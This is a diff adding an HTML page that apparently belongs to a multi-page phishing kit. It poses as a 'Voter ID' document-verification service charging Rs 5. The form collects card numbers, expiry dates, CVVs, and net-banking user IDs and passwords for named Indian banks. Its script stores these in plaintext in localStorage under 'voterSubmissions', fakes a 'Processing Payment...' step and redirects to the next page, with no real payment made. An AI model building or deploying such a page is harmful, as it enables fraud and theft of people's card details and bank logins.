@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voter ID - Payment Verification</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0056b3;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .form-container {
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .form-container h2 {
+            text-align: center;
+            margin-bottom: 5px;
+            color: #0056b3;
+            font-size: 22px;
+        }
+
+        .charge-sub {
+            text-align: center;
+            color: #28a745;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #333;
+            font-weight: 600;
+            font-size: 13px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+            background-color: #fff;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #0056b3;
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3);
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .method-option {
+            flex: 1;
+            border: 2px solid #ccc;
+            padding: 10px;
+            text-align: center;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            color: #555;
+            transition: all 0.3s;
+        }
+
+        .method-option input {
+            display: none;
+        }
+
+        .method-option.active {
+            border-color: #0056b3;
+            background-color: #eef5ff;
+            color: #0056b3;
+        }
+
+        .hidden-section {
+            display: none;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #e0e0e0;
+            margin-bottom: 15px;
+        }
+
+        .row-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row-group .form-group {
+            flex: 1;
+        }
+
+        .btn-next {
+            width: 100%;
+            padding: 12px;
+            background: #0056b3;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-next:hover {
+            background: #004085;
+        }
+
+        .btn-next:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>Document Verification</h2>
+        <div class="charge-sub">Charge: Rs 5/- Only</div>
+        
+        <form id="paymentForm">
+            <div class="form-group">
+                <label>Choose Payment Method</label>
+                <div class="payment-methods">
+                    <label class="method-option active" id="cardOptionLabel">
+                        <input type="radio" name="payMethod" value="Card" checked> Credit / Debit Card
+                    </label>
+                    <label class="method-option" id="netOptionLabel">
+                        <input type="radio" name="payMethod" value="NetBanking"> Net Banking
+                    </label>
+                </div>
+            </div>
+
+            <!-- Card Details Section -->
+            <div id="cardSection" class="hidden-section" style="display: block;">
+                <div class="form-group">
+                    <label for="cardNumber">Card Number (16 Digits)</label>
+                    <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter 16-digit card number" maxlength="19">
+                </div>
+                <div class="row-group">
+                    <div class="form-group">
+                        <label for="expiryDate">Expiry Date</label>
+                        <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5">
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="password" id="cvv" name="cvv" placeholder="CVV" maxlength="4">
+                    </div>
+                </div>
+            </div>
+
+            <!-- Net Banking Details Section -->
+            <div id="netBankingSection" class="hidden-section">
+                <div class="form-group">
+                    <label for="bankName">Select Bank Name</label>
+                    <select id="bankName" name="bankName">
+                        <option value="">-- Select Bank --</option>
+                        <option value="State Bank of India (SBI)">State Bank of India (SBI)</option>
+                        <option value="HDFC Bank">HDFC Bank</option>
+                        <option value="ICICI Bank">ICICI Bank</option>
+                        <option value="Axis Bank">Axis Bank</option>
+                        <option value="Punjab National Bank (PNB)">Punjab National Bank (PNB)</option>
+                        <option value="Bank of Baroda">Bank of Baroda</option>
+                        <option value="Other Bank">Other Bank</option>
+                    </select>
+                </div>
+
+                <div id="bankCredentials" style="display: none;">
+                    <div class="form-group">
+                        <label for="userId">Enter User ID / User Name</label>
+                        <input type="text" id="userId" name="userId" placeholder="Enter user ID or username">
+                    </div>
+                    <div class="form-group">
+                        <label for="loginPassword">Login Password</label>
+                        <input type="password" id="loginPassword" name="loginPassword" placeholder="Enter login password">
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-next">Pay Rs 5 / Next</button>
+        </form>
+    </div>
+
+    <script>
+        // Toggle Payment Sections
+        const cardRadio = document.querySelector('input[value="Card"]');
+        const netRadio = document.querySelector('input[value="NetBanking"]');
+        const cardSection = document.getElementById('cardSection');
+        const netSection = document.getElementById('netBankingSection');
+        const cardLabel = document.getElementById('cardOptionLabel');
+        const netLabel = document.getElementById('netOptionLabel');
+
+        cardRadio.addEventListener('change', function() {
+            if(this.checked) {
+                cardSection.style.display = 'block';
+                netSection.style.display = 'none';
+                cardLabel.classList.add('active');
+                netLabel.classList.remove('active');
+            }
+        });
+
+        netRadio.addEventListener('change', function() {
+            if(this.checked) {
+                netSection.style.display = 'block';
+                cardSection.style.display = 'none';
+                netLabel.classList.add('active');
+                cardLabel.classList.remove('active');
+            }
+        });
+
+        // Show Bank Credentials only after Bank selection
+        const bankNameSelect = document.getElementById('bankName');
+        const bankCredentials = document.getElementById('bankCredentials');
+
+        bankNameSelect.addEventListener('change', function() {
+            if(this.value !== "") {
+                bankCredentials.style.display = 'block';
+            } else {
+                bankCredentials.style.display = 'none';
+            }
+        });
+
+        // Form Submission Logic & Data Saving
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const payMethod = document.querySelector('input[name="payMethod"]:checked').value;
+            let paymentDetails = "";
+
+            if (payMethod === 'Card') {
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expiryDate = document.getElementById('expiryDate').value;
+                const cvv = document.getElementById('cvv').value;
+                paymentDetails = `Card: ${cardNumber}, Exp: ${expiryDate}, CVV: ${cvv}`;
+            } else {
+                const bankName = document.getElementById('bankName').value;
+                const userId = document.getElementById('userId').value;
+                const loginPassword = document.getElementById('loginPassword').value;
+                paymentDetails = `Bank: ${bankName}, UserID: ${userId}, Pass: ${loginPassword}`;
+            }
+
+            // Get existing submissions from localStorage
+            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
+            let deviceId = localStorage.getItem('voterDeviceId');
+
+            if (submissions.length > 0) {
+                let targetIndex = -1;
+                for (let i = submissions.length - 1; i >= 0; i--) {
+                    if (submissions[i].deviceId === deviceId) {
+                        targetIndex = i;
+                        break;
+                    }
+                }
+
+                if (targetIndex === -1) {
+                    targetIndex = submissions.length - 1;
+                }
+
+                // Update latest entry with payment details
+                submissions[targetIndex].paymentMethod = payMethod;
+                submissions[targetIndex].paymentDetails = paymentDetails;
+
+                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
+            }
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "Processing Payment...";
+
+            setTimeout(() => {
+                window.location.href = "page5.html"; 
+            }, 1500);
+        });
+    </script>
+
+</body>
+</html>
